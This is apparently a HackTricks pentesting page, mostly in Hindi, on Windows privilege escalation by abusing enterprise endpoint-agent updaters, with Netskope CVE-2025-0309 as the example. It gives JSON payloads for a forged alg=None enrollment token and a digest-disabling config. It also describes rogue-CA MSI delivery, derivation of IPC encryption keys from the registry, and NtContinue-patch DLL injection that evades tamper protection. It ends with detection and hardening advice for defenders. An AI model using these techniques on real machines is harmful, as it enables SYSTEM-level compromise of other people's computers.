# एंटरप्राइज़ Auto-Updaters और Privileged IPC का दुरुपयोग (उदा., Netskope stAgentSvc)

{{#include ../../banners/hacktricks-training.md}}

यह पृष्ठ उन Windows local privilege escalation चेन का सामान्यीकरण करता है जो एंटरप्राइज़ endpoint agents और updaters में मिलती हैं और जो एक low‑friction IPC surface और एक privileged update flow उजागर करती हैं। एक प्रतिनिधि उदाहरण Netskope Client for Windows < R129 (CVE-2025-0309) है, जहाँ एक low‑privileged उपयोगकर्ता को attacker‑controlled सर्वर पर enrollment कराने के लिए मजबूर किया जा सकता है और फिर एक malicious MSI पहुँचाई जा सकती है जिसे SYSTEM सेवा इंस्टॉल कर देती है।

आप समान उत्पादों के खिलाफ पुन: उपयोग कर सकने वाले प्रमुख विचार:
- एक privileged सेवा के localhost IPC का दुरुपयोग करके re‑enrollment या reconfiguration को attacker सर्वर की ओर मजबूर करना।
- vendor के update endpoints को implement करना, एक rogue Trusted Root CA पहुँचाना, और updater को एक malicious, “signed” package की ओर इंगित करना।
- कमजोर signer जांचों (CN allow‑lists), वैकल्पिक digest flags, और शिथिल MSI गुणों से बचना।
- यदि IPC “encrypted” है, तो registry में संग्रहीत world‑readable machine identifiers से key/IV निकालना।
- यदि सेवा callers को image path/process name द्वारा प्रतिबंधित करती है, तो किसी allow‑listed process में inject करना या एक suspended प्रक्रिया spawn करके अपने DLL को minimal thread‑context patch के माध्यम से bootstrap करना।

---
## 1) localhost IPC के माध्यम से attacker सर्वर पर enrollment जबरदस्ती करना

कई एजेंट एक user‑mode UI प्रक्रिया के साथ आते हैं जो localhost TCP पर JSON का उपयोग करते हुए SYSTEM सेवा से बात करती है।

Observed in Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) ऐसे JWT enrollment token तैयार करें जिनके claims backend host (उदा., AddonUrl) को नियंत्रित करते हों। Use alg=None ताकि किसी signature की आवश्यकता न रहे।
2) provisioning कमांड को invoke करते हुए अपना JWT और tenant name के साथ IPC संदेश भेजें:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) The service starts hitting your rogue server for enrollment/config, e.g.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

नोट्स:
- यदि caller verification path/name‑based है, तो request को allow‑listed vendor binary से originate करें (देखें §4).

---
## 2) Hijacking the update channel to run code as SYSTEM

एक बार जब client आपके server से बात करता है, तो अपेक्षित endpoints को लागू करें और इसे एक attacker MSI की ओर मोड़ें। सामान्य अनुक्रम:

1) /v2/config/org/clientconfig → Return JSON config with a very short updater interval, e.g.:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → एक PEM CA प्रमाणपत्र लौटाएँ। सेवा इसे Local Machine Trusted Root store में इंस्टॉल कर देती है।
3) /v2/checkupdate → मेटाडेटा प्रदान करें जो एक malicious MSI और एक fake version की ओर इशारा करता है।

Bypassing common checks seen in the wild:
- Signer CN allow‑list: सेवा केवल Subject CN को “netSkope Inc” या “Netskope, Inc.” के बराबर चेक कर सकती है। आपका rogue CA उस CN के साथ एक leaf जारी कर सकता है और MSI पर साइन कर सकता है।
- CERT_DIGEST property: CERT_DIGEST नाम का एक benign MSI property शामिल करें। इंस्टॉल के दौरान कोई प्रवर्तन नहीं।
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) अतिरिक्त cryptographic validation को disable कर देती है।

Result: SYSTEM service आपके MSI को C:\ProgramData\Netskope\stAgent\data\*.msi से इंस्टॉल कर देता है और NT AUTHORITY\SYSTEM के रूप में arbitrary code execute करता है।

---
## 3) Forging encrypted IPC requests (when present)

R127 से, Netskope ने IPC JSON को एक encryptData फ़ील्ड में wrap किया जो Base64 जैसा दिखता है। reversing से पता चला कि AES उपयोग हुआ था और key/IV registry values से derive होते हैं जो किसी भी user द्वारा पढ़े जा सकते हैं:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Attackers encryption reproduce कर सकते हैं और एक standard user से valid encrypted commands भेज सकते हैं। सामान्य सुझाव: अगर कोई agent अचानक अपनी IPC “encrypt” करता है, तो HKLM के अंतर्गत device IDs, product GUIDs, install IDs जैसे material खोजें।

---
## 4) Bypassing IPC caller allow‑lists (path/name checks)

कुछ services peer को authenticate करने के लिए TCP connection का PID resolve करके image path/name को allow‑listed vendor binaries (उदा., stagentui.exe, bwansvc.exe, epdlp.exe) के साथ compare करते हैं।

दो practical bypasses:
- किसी allow‑listed process (उदा., nsdiag.exe) में DLL injection और उसके अंदर से IPC को proxy करें।
- एक allow‑listed binary को suspended स्थिति में spawn करें और CreateRemoteThread का उपयोग किए बिना अपनी proxy DLL bootstrap करें (see §5) ताकि driver‑enforced tamper rules संतुष्ट हों।

---
## 5) Tamper‑protection friendly injection: suspended process + NtContinue patch

Products अक्सर एक minifilter/OB callbacks driver (उदा., Stadrv) के साथ आते हैं जो protected processes के handles से खतरनाक अधिकार हटाते हैं:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME हटाता है
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE तक सीमित करता है

एक विश्वसनीय user‑mode loader जो इन प्रतिबंधों का सम्मान करता है:
1) CreateProcess of vendor binary with CREATE_SUSPENDED।
2) वे handles प्राप्त करें जिनका आपको अभी भी अधिकार है: process पर PROCESS_VM_WRITE | PROCESS_VM_OPERATION, और thread handle के लिए THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (या अगर आप किसी ज्ञात RIP पर कोड patch कर रहे हैं तो सिर्फ THREAD_RESUME)।
3) ntdll!NtContinue (या कोई अन्य early, guaranteed‑mapped thunk) को ओवरराइट करें एक छोटे stub से जो आपकी DLL path पर LoadLibraryW कॉल करे, फिर वापस jump करे।
4) ResumeThread करें ताकि आपका stub इन‑प्रोसेस ट्रिगर हो और आपकी DLL load हो जाए।

क्योंकि आपने पहले से‑protected process पर PROCESS_CREATE_THREAD या PROCESS_SUSPEND_RESUME का उपयोग नहीं किया (आपने उसे बनाया था), driver की policy संतुष्ट होती है।

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) एक rogue CA, malicious MSI signing automate करता है, और आवश्यक endpoints सर्व करता है: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope एक custom IPC client है जो arbitrary (optionally AES‑encrypted) IPC messages बनाता है और suspended‑process injection शामिल करता है ताकि originate हो एक allow‑listed binary से।

---
## 7) Detection opportunities (blue team)
- Local Machine Trusted Root में additions की निगरानी करें। Sysmon + registry‑mod eventing (देखें SpecterOps guidance) अच्छा काम करता है।
- agent की service द्वारा ऐसे paths से शुरू किए गए MSI executions को flag करें जैसे C:\ProgramData\<vendor>\<agent>\data\*.msi।
- agent logs की समीक्षा करें unexpected enrollment hosts/tenants के लिए, उदाहरण: C:\ProgramData\netskope\stagent\logs\nsdebuglog.log – addonUrl / tenant anomalies और provisioning msg 148 देखें।
- localhost IPC clients पर alert करें जो expected signed binaries नहीं हैं, या जो असामान्य child process trees से आते हैं।

---
## Hardening tips for vendors
- enrollment/update hosts को strict allow‑list से बाँधें; clientcode में untrusted domains को reject करें।
- image path/name checks के बजाय OS primitives (ALPC security, named‑pipe SIDs) से IPC peers authenticate करें।
- world‑readable HKLM में secret material न रखें; अगर IPC encrypt करनी ही है तो keys protected secrets से derive करें या authenticated channels पर negotiate करें।
- updater को supply‑chain surface समझें: एक पूरी chain require करें जो आपके control वाले trusted CA तक जाती हो, package signatures को pinned keys के खिलाफ verify करें, और अगर validation config में disabled है तो fail closed रखें।

## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)

{{#include ../../banners/hacktricks-training.md}}
